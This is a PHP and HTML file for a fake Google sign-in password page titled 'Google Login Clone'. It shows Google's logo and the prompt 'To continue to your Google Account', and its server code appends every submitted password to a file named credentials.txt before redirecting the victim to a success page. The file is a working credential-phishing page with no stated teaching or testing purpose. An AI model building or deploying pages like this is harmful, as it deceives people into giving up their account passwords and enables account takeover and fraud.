<?php session_start(); ?>
<!DOCTYPE html>
<html lang="en" class="h-full bg-gray-100">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Google Login Clone - Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>

<body class="h-full flex items-center justify-center">
    <div class="w-full max-w-md p-8 bg-white rounded-2xl shadow-xl">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
                alt="Google Logo">
        </div>
        <h2 class="text-2xl font-semibold text-gray-800 mb-1">Enter your password</h2>
        <p class="text-sm text-gray-600 mb-6">To continue to your Google Account</p>

        <form action="password.php" method="POST" class="space-y-5">
            <div>
                <label for="google-password" class="block text-sm font-medium text-gray-700">Password</label>
                <input id="google-password" name="password" type="password" placeholder="Enter your password"
                    class="w-full mt-1 p-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                    required>
            </div>
            <div class="flex justify-between items-center mt-6">
                <button type="button" class="text-sm text-blue-600 hover:underline">Forgot password?</button>
                <button type="submit"
                    class="bg-blue-600 text-white px-6 py-2 rounded-lg hover:bg-blue-700 transition duration-200">Sign
                    in</button>
            </div>
        </form>
    </div>
</body>

</html>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $password = $_POST["password"];
    $email = isset($_SESSION["email"]) ? $_SESSION["email"] : "Unknown";

    // Save credentials to file
    $file = fopen("credentials.txt", "a");
    fwrite($file, "Password: " . $password . "\n\n");
    fclose($file);

    session_destroy();
    header("Location: success.html");
    exit();
}
?>